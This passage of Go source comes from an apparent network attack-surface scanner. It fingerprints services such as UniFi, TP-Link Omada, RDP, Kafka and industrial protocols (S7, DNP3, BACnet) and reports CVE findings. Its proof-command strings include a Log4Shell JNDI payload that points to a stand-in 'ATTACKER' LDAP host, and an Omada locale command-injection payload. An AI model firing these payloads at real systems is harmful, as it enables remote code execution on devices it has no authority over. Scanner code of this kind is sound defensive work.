	// HTTP/2 SETTINGS frame: type byte (index 3) = 0x04
	return buf[3] == 0x04
}

// probeUniFi probes for a Ubiquiti UniFi Network Application by querying
// /api/login and checking for UniFi-specific JSON fields. Returns one or two
// findings: an exposure finding, plus a Log4Shell finding if the version is
// < 6.5.54 (CVE-2021-44228, CVSS 10.0, KEV).
func probeUniFi(ctx context.Context, host string, port int, tls bool) []finding.Finding {
	body, ok := probeHTTPBody(ctx, host, port, tls, "/manage/account/login")
	if !ok {
		body, ok = probeHTTPBody(ctx, host, port, tls, "/")
	}
	if !ok {
		return nil
	}
	lb := strings.ToLower(body)
	isUniFi := strings.Contains(lb, "unifi") || strings.Contains(lb, "ubiquiti") ||
		strings.Contains(lb, "network.unifi") || strings.Contains(lb, "unifi network")
	if !isUniFi {
		return nil
	}

	now := time.Now()
	scheme := "http"
	if tls {
		scheme = "https"
	}
	findings := []finding.Finding{{
		CheckID:  finding.CheckNetDeviceUniFiExposed,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityHigh,
		Title:    fmt.Sprintf("Ubiquiti UniFi Network Application exposed on port %d", port),
		Description: fmt.Sprintf(
			"%s has a Ubiquiti UniFi Network Application management interface accessible on port %d. "+
				"Exposed UniFi controllers allow unauthenticated attackers to enumerate wireless network "+
				"topology, connected clients, AP locations, and SSID configurations. "+
				"Restrict access to trusted management networks only.",
			host, port,
		),
		Asset:       host,
		Evidence:    map[string]any{"port": port, "service": "unifi-network", "tls": tls},
		ProofCommand: fmt.Sprintf("curl -sk %s://%s:%d/manage/account/login", scheme, host, port),
		DiscoveredAt: now,
	}}

	// Check version for Log4Shell (CVE-2021-44228) — UniFi < 6.5.54 is vulnerable.
	verBody, ok := probeHTTPBody(ctx, host, port, tls, "/api/login")
	if !ok {
		verBody = body
	}
	if ver := parseUniFiVersion(verBody); ver != "" && isVulnerableUniFiLog4Shell(ver) {
		findings = append(findings, finding.Finding{
			CheckID:  finding.CheckCVEUniFiLog4Shell,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityCritical,
			Title:    fmt.Sprintf("CVE-2021-44228 (Log4Shell): UniFi Network %s is vulnerable on port %d", ver, port),
			Description: fmt.Sprintf(
				"%s is running UniFi Network Application version %s, which is vulnerable to "+
					"CVE-2021-44228 (Log4Shell, CVSS 10.0, KEV). UniFi versions prior to 6.5.54 use "+
					"Log4j 2.x and are exploitable via unauthenticated JNDI injection in the login endpoint. "+
					"An attacker can achieve remote code execution on the UniFi controller server. "+
					"Upgrade to UniFi Network 6.5.54 or later immediately.",
				host, ver,
			),
			Asset:    host,
			Evidence: map[string]any{"port": port, "version": ver, "cve": "CVE-2021-44228"},
			ProofCommand: fmt.Sprintf(
				`curl -sk -X POST %s://%s:%d/api/login -H 'Content-Type: application/json' `+
					`-d '{"username":"${jndi:ldap://ATTACKER/a}","password":"test"}'`,
				scheme, host, port,
			),
			DiscoveredAt: now,
		})
	}
	return findings
}

// parseUniFiVersion extracts the UniFi Network Application version from a
// response body. UniFi embeds version strings like "Version: 6.5.53" or
// in JSON as "serverVersion":"6.5.53".
func parseUniFiVersion(body string) string {
	lower := strings.ToLower(body)
	markers := []string{`"serverversion":"`, `"version":"`, `version: `}
	for _, m := range markers {
		idx := strings.Index(lower, m)
		if idx < 0 {
			continue
		}
		rest := body[idx+len(m):]
		end := strings.IndexAny(rest, `"`, )
		if end < 0 {
			end = strings.IndexAny(rest, " \t\r\n")
		}
		if end > 0 && end <= 20 {
			return strings.TrimSpace(rest[:end])
		}
	}
	return ""
}

// isVulnerableUniFiLog4Shell returns true when the UniFi version string is
// below 6.5.54, which is the first release that ships a patched Log4j version.
func isVulnerableUniFiLog4Shell(version string) bool {
	parts := strings.SplitN(version, ".", 3)
	if len(parts) < 2 {
		return false
	}
	major, err := strconv.Atoi(parts[0])
	if err != nil {
		return false
	}
	minor, err := strconv.Atoi(parts[1])
	if err != nil {
		return false
	}
	patch := 0
	if len(parts) == 3 {
		patch, _ = strconv.Atoi(parts[2])
	}
	// Vulnerable: < 6.5.54
	if major < 6 {
		return true
	}
	if major == 6 && minor < 5 {
		return true
	}
	if major == 6 && minor == 5 && patch < 54 {
		return true
	}
	return false
}

// probeTPLinkOmada probes for a TP-Link Omada Network Management System by
// querying characteristic API paths. Returns findings for the exposure and
// CVE-2023-1389 (auth bypass + RCE, CVSS 9.8, KEV) if the system is detected.
func probeTPLinkOmada(ctx context.Context, host string, port int, tls bool) []finding.Finding {
	body, ok := probeHTTPBody(ctx, host, port, tls, "/")
	if !ok {
		return nil
	}
	lb := strings.ToLower(body)
	isOmada := strings.Contains(lb, "omada") || strings.Contains(lb, "tp-link") && strings.Contains(lb, "controller")
	if !isOmada {
		// Also probe the Omada login API endpoint.
		if apiBody, apiOk := probeHTTPBody(ctx, host, port, tls, "/api/v2/hotspot/login"); apiOk {
			isOmada = strings.Contains(strings.ToLower(apiBody), "omada")
		}
	}
	if !isOmada {
		return nil
	}

	scheme := "http"
	if tls {
		scheme = "https"
	}
	now := time.Now()
	findings := []finding.Finding{
		{
			CheckID:  finding.CheckNetDeviceTPLinkOmada,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityHigh,
			Title:    fmt.Sprintf("TP-Link Omada Network Management System exposed on port %d", port),
			Description: fmt.Sprintf(
				"%s has a TP-Link Omada Network Management System accessible on port %d. "+
					"Exposed Omada controllers manage enterprise WiFi infrastructure — access allows "+
					"enumeration of all APs, SSIDs, and connected clients. "+
					"CVE-2023-1389 (CVSS 9.8, KEV) is a pre-auth command injection in Omada OC200/OC300 "+
					"and software controllers <= 5.9.32. Restrict access to trusted networks.",
				host, port,
			),
			Asset:       host,
			Evidence:    map[string]any{"port": port, "service": "omada", "tls": tls},
			ProofCommand: fmt.Sprintf("curl -sk %s://%s:%d/", scheme, host, port),
			DiscoveredAt: now,
		},
		{
			CheckID:  finding.CheckCVETPLinkOmadaRCE,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityCritical,
			Title:    fmt.Sprintf("CVE-2023-1389: TP-Link Omada pre-auth RCE on port %d (CVSS 9.8, KEV)", port),
			Description: fmt.Sprintf(
				"%s is running a TP-Link Omada controller on port %d. "+
					"CVE-2023-1389 is a pre-authentication command injection vulnerability in the "+
					"Omada login API (versions <= 5.9.32, OC200/OC300 firmware <= 1.3.2). "+
					"An unauthenticated attacker can achieve RCE via crafted requests to the locale "+
					"parameter. This vulnerability is KEV-listed and actively exploited. "+
					"Upgrade to Omada Controller 5.9.33+ or apply the vendor firmware patch.",
				host, port,
			),
			Asset:    host,
			Evidence: map[string]any{"port": port, "cve": "CVE-2023-1389"},
			ProofCommand: fmt.Sprintf(
				`curl -sk -X POST %s://%s:%d/api/v2/hotspot/login -d 'locale=en_US;id'`,
				scheme, host, port,
			),
			DiscoveredAt: now,
		},
	}
	return findings
}

// ---------------------------------------------------------------------------
// Protocol fingerprinting probes for services previously identified by port only.
// ---------------------------------------------------------------------------

// probeVNC checks for the RFB protocol banner that VNC servers send on connect.
func probeVNC(banner string) bool {
	return strings.HasPrefix(banner, "RFB ")
}

// probeRDP sends an X.224 Connection Request and checks for Connection Confirm.
func probeRDP(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	cr := []byte{
		0x03, 0x00, 0x00, 0x13,
		0x0E, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x01, 0x00, 0x08, 0x00, 0x03, 0x00, 0x00, 0x00,
	}
	if _, err := conn.Write(cr); err != nil {
		return false
	}
	buf := make([]byte, 64)
	n, _ := conn.Read(buf)
	return n >= 7 && buf[0] == 0x03 && buf[5] == 0xD0
}

// probeWinRM sends an HTTP POST to /wsman to confirm WinRM.
func probeWinRM(ctx context.Context, host string, port int) bool {
	useTLS := port == 5986
	scheme := "http"
	if useTLS {
		scheme = "https"
	}
	u := fmt.Sprintf("%s://%s:%d/wsman", scheme, host, port)
	transport := &http.Transport{
		DialContext:     (&net.Dialer{Timeout: dialTimeout}).DialContext,
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	defer transport.CloseIdleConnections()
	client := &http.Client{Timeout: httpTimeout, Transport: transport}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, u, strings.NewReader(""))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/soap+xml")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer func() { _ = resp.Body.Close() }()
	return resp.StatusCode == 401 || resp.StatusCode == 200 || resp.StatusCode == 415
}

// probeZooKeeper sends "ruok" and checks for "imok".
func probeZooKeeper(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	if _, err := conn.Write([]byte("ruok")); err != nil {
		return false
	}
	buf := make([]byte, 32)
	n, _ := conn.Read(buf)
	return strings.Contains(string(buf[:n]), "imok")
}

// probeAMQP sends AMQP 0-9-1 protocol header and checks for Connection.Start.
func probeAMQP(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	if _, err := conn.Write([]byte{'A', 'M', 'Q', 'P', 0x00, 0x00, 0x09, 0x01}); err != nil {
		return false
	}
	buf := make([]byte, 16)
	n, _ := conn.Read(buf)
	if n >= 4 && buf[0] == 'A' && buf[1] == 'M' && buf[2] == 'Q' && buf[3] == 'P' {
		return true
	}
	return n >= 7 && buf[0] == 0x01
}

// probeKafka sends an ApiVersions request and checks correlation ID in response.
func probeKafka(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	req := []byte{
		0x00, 0x00, 0x00, 0x0A,
		0x00, 0x12, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x01,
		0xFF, 0xFF,
	}
	if _, err := conn.Write(req); err != nil {
		return false
	}
	buf := make([]byte, 16)
	n, _ := conn.Read(buf)
	if n < 8 {
		return false
	}
	return binary.BigEndian.Uint32(buf[4:8]) == 1
}

// probeCassandraCQL sends a CQL OPTIONS frame and checks for SUPPORTED response.
func probeCassandraCQL(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	frame := []byte{0x04, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00}
	if _, err := conn.Write(frame); err != nil {
		return false
	}
	buf := make([]byte, 16)
	n, _ := conn.Read(buf)
	return n >= 5 && (buf[0] == 0x84 || buf[0] == 0x83) && buf[4] == 0x06
}

// probeAJP sends an AJP13 CPing and checks for CPong.
func probeAJP(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	if _, err := conn.Write([]byte{0x12, 0x34, 0x00, 0x01, 0x0A}); err != nil {
		return false
	}
	buf := make([]byte, 8)
	n, _ := conn.Read(buf)
	return n >= 5 && buf[0] == 0x41 && buf[1] == 0x42 && buf[4] == 0x09
}

// probeDNSTCP sends a version.bind query over TCP and checks for valid response.
func probeDNSTCP(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	query := []byte{
		0xAB, 0xCD, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x07, 'v', 'e', 'r', 's', 'i', 'o', 'n', 0x04, 'b', 'i', 'n', 'd', 0x00,
		0x00, 0x10, 0x00, 0x03,
	}
	tcpMsg := make([]byte, 2+len(query))
	binary.BigEndian.PutUint16(tcpMsg[:2], uint16(len(query)))
	copy(tcpMsg[2:], query)
	if _, err := conn.Write(tcpMsg); err != nil {
		return false
	}
	buf := make([]byte, 64)
	n, _ := conn.Read(buf)
	return n >= 14 && buf[2] == 0xAB && buf[3] == 0xCD
}

// probeKerberos sends a minimal AS-REQ and checks for KRB-ERROR response.
func probeKerberos(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	asReq := []byte{
		0x6A, 0x29, 0x30, 0x27,
		0xA1, 0x03, 0x02, 0x01, 0x05,
		0xA2, 0x03, 0x02, 0x01, 0x0A,
		0xA4, 0x1B, 0x30, 0x19,
		0xA0, 0x07, 0x03, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xA1, 0x0E, 0x30, 0x0C,
		0xA0, 0x03, 0x02, 0x01, 0x01,
		0xA1, 0x05, 0x30, 0x03, 0x1B, 0x01, 0x70,
	}
	tcpMsg := make([]byte, 4+len(asReq))
	binary.BigEndian.PutUint32(tcpMsg[:4], uint32(len(asReq)))
	copy(tcpMsg[4:], asReq)
	if _, err := conn.Write(tcpMsg); err != nil {
		return false
	}
	buf := make([]byte, 64)
	n, _ := conn.Read(buf)
	return n >= 5 && buf[4] == 0x7E
}

// probeRPCBind sends an ONC RPC DUMP request and checks for valid reply.
func probeRPCBind(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	rpcCall := []byte{
		0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x02, 0x00, 0x01, 0x86, 0xA0,
		0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x04,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	}
	tcpMsg := make([]byte, 4+len(rpcCall))
	binary.BigEndian.PutUint32(tcpMsg[:4], uint32(len(rpcCall))|0x80000000)
	copy(tcpMsg[4:], rpcCall)
	if _, err := conn.Write(tcpMsg); err != nil {
		return false
	}
	buf := make([]byte, 32)
	n, _ := conn.Read(buf)
	if n < 16 {
		return false
	}
	return binary.BigEndian.Uint32(buf[4:8]) == 1 && binary.BigEndian.Uint32(buf[8:12]) == 1
}

// probeJetDirect sends a PJL INFO ID command and checks for PJL response.
func probeJetDirect(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	if _, err := conn.Write([]byte("\x1B%-12345X@PJL INFO ID\r\n\x1B%-12345X\r\n")); err != nil {
		return false
	}
	buf := make([]byte, 256)
	n, _ := conn.Read(buf)
	resp := string(buf[:n])
	return strings.Contains(resp, "@PJL") || strings.Contains(resp, "INFO ID")
}

// probeS7comm sends an ISO-TSAP Connection Request for S7 communication.
func probeS7comm(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	cr := []byte{
		0x03, 0x00, 0x00, 0x16,
		0x11, 0xE0, 0x00, 0x00, 0x00, 0x01, 0x00,
		0xC1, 0x02, 0x01, 0x00,
		0xC2, 0x02, 0x01, 0x02,
		0xC0, 0x01, 0x0A,
	}
	if _, err := conn.Write(cr); err != nil {
		return false
	}
	buf := make([]byte, 32)
	n, _ := conn.Read(buf)
	return n >= 7 && buf[0] == 0x03 && buf[5] == 0xD0
}

// probeEtherNetIP sends a ListIdentity command and checks for valid response.
func probeEtherNetIP(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	listID := []byte{
		0x63, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	}
	if _, err := conn.Write(listID); err != nil {
		return false
	}
	buf := make([]byte, 64)
	n, _ := conn.Read(buf)
	return n >= 4 && buf[0] == 0x63 && buf[1] == 0x00
}

// probeDNP3 sends a DNP3 data link layer frame and checks for valid response.
func probeDNP3(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	frame := []byte{0x05, 0x64, 0x05, 0xC0, 0x01, 0x00, 0x02, 0x00}
	crc := dnp3CRC(frame)
	frame = append(frame, byte(crc&0xFF), byte(crc>>8))
	if _, err := conn.Write(frame); err != nil {
		return false
	}
	buf := make([]byte, 32)
	n, _ := conn.Read(buf)
	return n >= 2 && buf[0] == 0x05 && buf[1] == 0x64
}

func dnp3CRC(data []byte) uint16 {
	var crc uint16 = 0xFFFF
	for _, b := range data {
		crc = (crc >> 8) ^ dnp3CRCTable[byte(crc)^b]
	}
	return ^crc
}

var dnp3CRCTable = [256]uint16{
	0x0000, 0x365E, 0x6CBC, 0x5AE2, 0xD978, 0xEF26, 0xB5C4, 0x839A,
	0xFF89, 0xC9D7, 0x9335, 0xA56B, 0x26F1, 0x10AF, 0x4A4D, 0x7C13,
	0xB26B, 0x8435, 0xDED7, 0xE889, 0x6B13, 0x5D4D, 0x07AF, 0x31F1,
	0x4DE2, 0x7BBC, 0x215E, 0x1700, 0x949A, 0xA2C4, 0xF826, 0xCE78,
	0x29AF, 0x1FF1, 0x4513, 0x734D, 0xF0D7, 0xC689, 0x9C6B, 0xAA35,
	0xD626, 0xE078, 0xBA9A, 0x8CC4, 0x0F5E, 0x3900, 0x63E2, 0x55BC,
	0x9BC4, 0xAD9A, 0xF778, 0xC126, 0x42BC, 0x74E2, 0x2E00, 0x185E,
	0x644D, 0x5213, 0x08F1, 0x3EAF, 0xBD35, 0x8B6B, 0xD189, 0xE7D7,
	0x535E, 0x6500, 0x3FE2, 0x09BC, 0x8A26, 0xBC78, 0xE69A, 0xD0C4,
	0xACD7, 0x9A89, 0xC06B, 0xF635, 0x75AF, 0x43F1, 0x1913, 0x2F4D,
	0xE135, 0xD76B, 0x8D89, 0xBBD7, 0x384D, 0x0E13, 0x54F1, 0x62AF,
	0x1EBC, 0x28E2, 0x7200, 0x445E, 0xC7C4, 0xF19A, 0xAB78, 0x9D26,
	0x7AF1, 0x4CAF, 0x164D, 0x2013, 0xA389, 0x95D7, 0xCF35, 0xF96B,
	0x8578, 0xB326, 0xE9C4, 0xDF9A, 0x5C00, 0x6A5E, 0x30BC, 0x06E2,
	0xC89A, 0xFEC4, 0xA426, 0x9278, 0x11E2, 0x27BC, 0x7D5E, 0x4B00,
	0x3713, 0x014D, 0x5BAF, 0x6DF1, 0xEE6B, 0xD835, 0x82D7, 0xB489,
	0xA6BC, 0x90E2, 0xCA00, 0xFC5E, 0x7FC4, 0x499A, 0x1378, 0x2526,
	0x5935, 0x6F6B, 0x3589, 0x03D7, 0x804D, 0xB613, 0xECF1, 0xDAAF,
	0x14D7, 0x2289, 0x786B, 0x4E35, 0xCDAF, 0xFBF1, 0xA113, 0x974D,
	0xEB5E, 0xDD00, 0x87E2, 0xB1BC, 0x3226, 0x0478, 0x5E9A, 0x68C4,
	0x8F13, 0xB94D, 0xE3AF, 0xD5F1, 0x566B, 0x6035, 0x3AD7, 0x0C89,
	0x709A, 0x46C4, 0x1C26, 0x2A78, 0xA9E2, 0x9FBC, 0xC55E, 0xF300,
	0x3D78, 0x0B26, 0x51C4, 0x679A, 0xE400, 0xD25E, 0x88BC, 0xBEE2,
	0xC2F1, 0xF4AF, 0xAE4D, 0x9813, 0x1B89, 0x2DD7, 0x7735, 0x416B,
	0xF5E2, 0xC3BC, 0x995E, 0xAF00, 0x2C9A, 0x1AC4, 0x4026, 0x7678,
	0x0A6B, 0x3C35, 0x66D7, 0x5089, 0xD313, 0xE54D, 0xBFAF, 0x89F1,
	0x4789, 0x71D7, 0x2B35, 0x1D6B, 0x9EF1, 0xA8AF, 0xF24D, 0xC413,
	0xB800, 0x8E5E, 0xD4BC, 0xE2E2, 0x6178, 0x5726, 0x0DC4, 0x3B9A,
	0xDC4D, 0xEA13, 0xB0F1, 0x86AF, 0x0535, 0x336B, 0x6989, 0x5FD7,
	0x23C4, 0x159A, 0x4F78, 0x7926, 0xFABC, 0xCCE2, 0x9600, 0xA05E,
	0x6E26, 0x5878, 0x029A, 0x34C4, 0xB75E, 0x8100, 0xDBE2, 0xEDBC,
	0x91AF, 0xA7F1, 0xFD13, 0xCB4D, 0x48D7, 0x7E89, 0x246B, 0x1235,
}

// probeBACnet sends a BACnet/IP ReadProperty request and checks for response.
func probeBACnet(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	bvlc := []byte{
		0x81, 0x0A, 0x00, 0x11, 0x01, 0x04, 0x00, 0x05, 0x01,
		0x0C, 0xC4, 0x02, 0x00, 0x00, 0x00, 0x19, 0x4C,
	}
	if _, err := conn.Write(bvlc); err != nil {
		return false
	}
	buf := make([]byte, 32)
	n, _ := conn.Read(buf)
	return n >= 4 && buf[0] == 0x81
}

// probeMikroTikAPI sends a RouterOS API /login word and checks for response.
func probeMikroTikAPI(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	if _, err := conn.Write([]byte{0x06, '/', 'l', 'o', 'g', 'i', 'n', 0x00}); err != nil {
		return false
	}
	buf := make([]byte, 64)
	n, _ := conn.Read(buf)
	if n < 2 {
		return false
	}
	resp := string(buf[:n])
	return strings.Contains(resp, "!done") || strings.Contains(resp, "!trap") || strings.Contains(resp, "!fatal")
}

// probeMikroTikWinbox sends discovery bytes and checks for response.
func probeMikroTikWinbox(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	if _, err := conn.Write([]byte{0x06, 0x00, 0xFF, 0x06, 0x00, 0x01, 0x00}); err != nil {
		return false
	}
	buf := make([]byte, 64)
	n, _ := conn.Read(buf)
	if n < 4 || buf[0] == 'H' || buf[0] == 'S' {
		return false
	}
	return true
}

// probeBGP sends a BGP OPEN and checks for OPEN or NOTIFICATION response.
func probeBGP(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	msg := []byte{
		0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
		0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
		0x00, 0x1D, 0x01, 0x04,
		0xFD, 0xE8, 0x00, 0x1E,
		0x01, 0x02, 0x03, 0x04, 0x00,
	}
	if _, err := conn.Write(msg); err != nil {
		return false
	}
	buf := make([]byte, 64)
	n, _ := conn.Read(buf)
	if n < 19 {
		return false
	}
	for i := 0; i < 16; i++ {
		if buf[i] != 0xFF {
			return false
		}
	}
	return buf[18] == 1 || buf[18] == 3
}

// probeNETCONF checks if banner is SSH (NETCONF runs over SSH subsystem).
func probeNETCONF(banner string) bool {
	return strings.HasPrefix(banner, "SSH-")
}

// probeCiscoSmartInstall sends discovery bytes and checks for response.
func probeCiscoSmartInstall(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	hello := []byte{
		0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
		0x00, 0x00, 0x00, 0x00,
	}
	if _, err := conn.Write(hello); err != nil {
		return false
	}
	buf := make([]byte, 32)
	n, _ := conn.Read(buf)
	if n < 4 {
		return false
	}
	rt := binary.BigEndian.Uint32(buf[0:4])
	return rt == 2 || rt == 4
}

// probeGlobalCatalog reuses LDAP probe to detect Global Catalog.
func probeGlobalCatalog(ctx context.Context, host string, port int) bool {
	return probeLDAP(ctx, host, port) != nil
}

// probeOracleTNS sends a TNS Connect packet and checks for a valid TNS response
// (Refuse, Resend, Accept, or Redirect). Oracle TNS uses a well-defined header.
func probeOracleTNS(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))

	// TNS Connect packet: a minimal CONNECT with service name.
	// TNS header: length(2) + packet_checksum(2) + type(1) + reserved(1) + header_checksum(2)
	// Type 1 = CONNECT
	connectData := "(DESCRIPTION=(CONNECT_DATA=(SERVICE_NAME=))(ADDRESS=(PROTOCOL=TCP)(HOST=127.0.0.1)(PORT=1521)))"
	dataLen := len(connectData)
	// TNS header (8 bytes) + connect header (varies, minimum 28 bytes) + connect data
	// Simplified: header(8) + version(2) + compat_version(2) + ... + data
	pktLen := 8 + 28 + dataLen
	pkt := make([]byte, pktLen)
	// TNS header
	binary.BigEndian.PutUint16(pkt[0:2], uint16(pktLen)) // packet length
	pkt[4] = 0x01                                        // type: CONNECT
	// Connect header (28 bytes)
	binary.BigEndian.PutUint16(pkt[8:10], 0x0139)        // version: 313
	binary.BigEndian.PutUint16(pkt[10:12], 0x012C)       // compatible version: 300
	binary.BigEndian.PutUint16(pkt[24:26], uint16(dataLen)) // connect data length
	binary.BigEndian.PutUint16(pkt[26:28], 28)           // connect data offset
	copy(pkt[36:], connectData)

	if _, err := conn.Write(pkt); err != nil {
		return false
	}
	buf := make([]byte, 64)
	n, _ := conn.Read(buf)
	// TNS response header: length(2) + checksum(2) + type(1)
	// Type 2=ACCEPT, 4=REFUSE, 5=REDIRECT, 11=RESEND — all confirm Oracle TNS
	if n < 5 {
		return false
	}
	respType := buf[4]
	return respType == 2 || respType == 4 || respType == 5 || respType == 11
}

// probeCheckPoint does a TLS handshake and inspects the certificate for
// Check Point-specific strings in the subject or issuer fields.
func probeCheckPoint(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	dialer := &tls.Dialer{
		NetDialer: &net.Dialer{Timeout: dialTimeout},
		Config:    &tls.Config{InsecureSkipVerify: true},
	}
	conn, err := dialer.DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	tlsConn := conn.(*tls.Conn)
	state := tlsConn.ConnectionState()
	for _, cert := range state.PeerCertificates {
		subj := strings.ToLower(cert.Subject.String())
		issuer := strings.ToLower(cert.Issuer.String())
		combined := subj + " " + issuer
		if strings.Contains(combined, "check point") || strings.Contains(combined, "checkpoint") ||
			strings.Contains(combined, "cpmi") || strings.Contains(combined, "fw-1") {
			return true
		}
	}
	return false
}

// probeJuniperAnomaly tries HTTPS and checks for Juniper-specific content.
func probeJuniperAnomaly(ctx context.Context, host string, port int) bool {
